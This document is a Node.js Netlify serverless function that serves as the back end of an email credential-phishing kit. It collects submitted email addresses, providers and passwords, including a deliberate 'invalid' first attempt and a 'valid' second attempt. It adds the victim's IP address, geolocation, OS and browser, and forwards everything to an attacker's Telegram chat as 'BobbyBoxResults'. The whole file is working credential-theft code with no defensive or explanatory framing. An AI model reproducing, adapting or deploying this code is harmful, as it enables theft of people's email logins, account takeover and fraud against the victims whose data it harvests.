const UAParser = require('ua-parser-js');

// --- Configuration ---
const CONFIG = {
  // Environment variables required by the function.
  // This centralizes env var access and makes dependencies clear.
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  },
  // Timeout for fetch requests in milliseconds.
  FETCH_TIMEOUT: 15000,
  // Fields to request from the IP geolocation API.
  GEO_API_FIELDS: 'country,regionName,query',
};

// --- Helper Functions ---

/**
 * Creates an AbortSignal that aborts after a specified time.
 * @param {number} ms - The timeout in milliseconds.
 * @returns {AbortSignal}
 */
const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

/**
 * Safely gets a header value, checking for case variations.
 * @param {object} headers - The request headers.
 * @param {string} name - The header name.
 * @returns {string}
 */
const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';

/**
 * Detects the client's IP address from various headers.
 * @param {object} event - The Netlify event object.
 * @returns {string}
 */
const getClientIp = (event) => {
  const headers = event.headers || {};
  const ip = getHeader(headers, 'x-forwarded-for') ||
             getHeader(headers, 'x-real-ip') ||
             getHeader(headers, 'cf-connecting-ip') ||
             event.requestContext?.identity?.sourceIp ||
             'Unknown';
  return ip.toString().split(',')[0].trim();
};

/**
 * Fetches geolocation data for a given IP address.
 * @param {string} ip - The IP address.
 * @returns {Promise<{country: string, regionName: string}>}
 */
const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip.startsWith('127.0.0.1')) {
    return location;
  }
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
      signal: createTimeoutSignal(3000), // Shorter timeout for geo lookup
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

/**
 * Parses user agent string to get device, OS, and browser info.
 * @param {string} userAgent - The user agent string.
 * @returns {object}
 */
const getDeviceDetails = (userAgent) => {
  const uaParser = new UAParser(userAgent || '');
  const browser = uaParser.getBrowser();
  const os = uaParser.getOS();
  
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
  };
};

/**
 * Composes the message to be sent to Telegram.
 * @param {object} data - The parsed request body.
 * @returns {string}
 */
const composeTelegramMessage = (data) => {
    const {
        email,
        provider,
        firstAttemptPassword,
        secondAttemptPassword,
        password, // Fallback
        clientIP,
        location,
        deviceDetails,
        timestamp,
        sessionId,
    } = data;

    const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;

    let passwordSection;
    if (hasTwoStepData) {
        passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
    } else {
        passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
    }

    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'UTC', hour12: true
    }) + ' UTC';

    return `
*🔐 BobbyBoxResults 🔐*

*ACCOUNT DETAILS*
- 📧 Email: \`${email || 'Not captured'}\`
- 🏢 Provider: *${provider || 'Others'}*
- ${passwordSection}

*DEVICE & LOCATION*
- 📍 IP Address: \`${clientIP}\`
- 🌍 Location: *${location.regionName}, ${location.country}*
- 💻 OS: *${deviceDetails.os}*
- 🌐 Browser: *${deviceDetails.browser}*
- 🖥️ Device Type: *${deviceDetails.deviceType}*

*SESSION INFO*
- 🕒 Timestamp: *${formattedTimestamp}*
- 🆔 Session ID: \`${sessionId}\`
`;
};


// --- Main Handler ---
exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  // Check for required environment variables at the start.
  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
  }
  
  try {
    const body = JSON.parse(event.body || '{}');
    const clientIP = getClientIp(event);
    const location = await getIpAndLocation(clientIP);
    const deviceDetails = getDeviceDetails(body.userAgent);
    const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);

    const messageData = {
        ...body,
        clientIP,
        location,
        deviceDetails,
        sessionId,
    };
    
    const message = composeTelegramMessage(messageData);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, sessionId }),
    };

  } catch (error) {
    console.error('Function execution error:', error.message);
    // Suppress sending error to Telegram to avoid noise, but keep it for server logs.
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'An internal server error occurred.' }),
    };
  }
};
